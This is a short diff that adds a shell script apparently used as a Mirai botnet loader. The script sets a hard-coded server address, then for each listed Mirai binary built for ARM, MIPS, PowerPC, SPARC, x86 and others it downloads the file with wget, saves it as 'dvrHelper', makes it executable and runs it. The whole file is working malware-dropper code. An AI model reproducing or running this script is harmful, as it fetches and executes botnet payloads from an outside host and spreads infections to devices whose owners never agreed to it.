@@ -1,0 +1,14 @@
+#!/bin/sh
+ 
+# Edit
+WEBSERVER="198.98.53.73:80"
+# Stop editing now
+ 
+ 
+BINARIES="bins.sh  mirai.arm  mirai.arm6 mirai.mips  mirai.mpsl	mirai.ppc  mirai.spc  mirai.x86"
+ 
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/$Binary -O dvrHelper
+    chmod 777 dvrHelper
+    ./dvrHelper
+done
